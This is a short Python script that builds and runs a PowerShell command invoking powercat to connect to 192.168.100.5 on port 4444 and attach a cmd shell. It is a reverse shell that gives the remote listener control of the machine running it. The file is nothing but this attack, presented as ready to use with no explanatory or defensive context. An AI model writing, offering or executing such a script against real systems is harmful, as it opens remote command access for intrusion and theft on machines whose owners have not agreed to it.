import subprocess

# Define the PowerShell command
powershell_command = "powershell -c \"C:\\path\\to\\powercat.ps1 -c 192.168.100.5 -p 4444 -e cmd\""

# Execute the PowerShell command
subprocess.run(powershell_command, shell=True)
